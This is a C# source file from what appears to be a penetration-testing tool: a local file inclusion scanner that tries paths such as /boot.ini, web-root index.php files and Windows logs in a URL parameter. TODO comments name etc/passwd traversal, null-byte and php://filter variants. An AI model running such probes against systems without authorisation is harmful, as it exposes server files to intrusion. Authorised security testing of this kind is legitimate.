using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using ReeCode;

namespace Reecon
{
    class LFI
    {
        public static void Scan(string path)
        {
            Console.WriteLine("Scanning: " + path);
            WebClient wc = new WebClient();
            HttpStatusCode statusCode = wc.GetResponseCode(path);
            if (statusCode != HttpStatusCode.OK)
            {
                Console.WriteLine(path + " is a 404 page :(");
                return;
            }

            string initialPart = path.Substring(0, path.IndexOf("=") + 1);
            Console.WriteLine("Initial part: " + initialPart);
            string result = wc.Get(initialPart + "Reelix", null);
            int notFoundLength = result.Length;
            Console.WriteLine("Scanning for not: " + notFoundLength);

            List<string> lfiChecks = new List<string>();
            // Linux
            lfiChecks.Add("/var/www/index.php");
            lfiChecks.Add("/var/www/html/index.php");
            // TODO: Various ../../../etc/passwd variations
            // Windows
            lfiChecks.Add("/boot.ini");
            lfiChecks.Add("/inetpub/wwwroot/index.php"); // 
            lfiChecks.Add("/Windows/debug/NetSetup.log"); // Some basic Windows info
            lfiChecks.Add("/Windows/SoftwareDistribution/ReportingEvents.log"); // Windows Patches
            lfiChecks.Add("/Windows/System32/cmd.exe"); // What Windows box doesn't have cmd?

            // TODO: Null Byte each
            // TODO: Base64 Encode Each --> bla=php://filter/convert.base64-encode/resource=locationHere

            foreach (string check in lfiChecks)
            {
                string toCheck = initialPart + check;
                int resultLength = wc.Get(toCheck, null).Length;
                if (resultLength != notFoundLength)
                {
                    Console.WriteLine(toCheck + " - LFI");
                }
            }
            Console.WriteLine("All Checks Done!");
        }
    }
}
